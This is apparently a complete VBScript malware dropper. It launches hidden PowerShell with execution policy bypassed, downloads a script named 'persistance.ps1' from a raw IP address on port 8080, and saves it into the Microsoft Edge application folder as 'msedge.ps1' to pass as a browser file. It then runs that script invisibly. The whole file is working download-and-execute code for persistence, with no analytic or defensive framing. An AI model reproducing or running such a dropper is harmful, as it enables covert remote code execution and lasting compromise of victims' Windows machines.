Set wscriptShell = CreateObject("Wscript.Shell")

wscriptShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri 'http://54.209.180.198:8080/persistance.ps1' -OutFile 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.ps1'""", 0, False

wscriptShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.ps1""", 0, False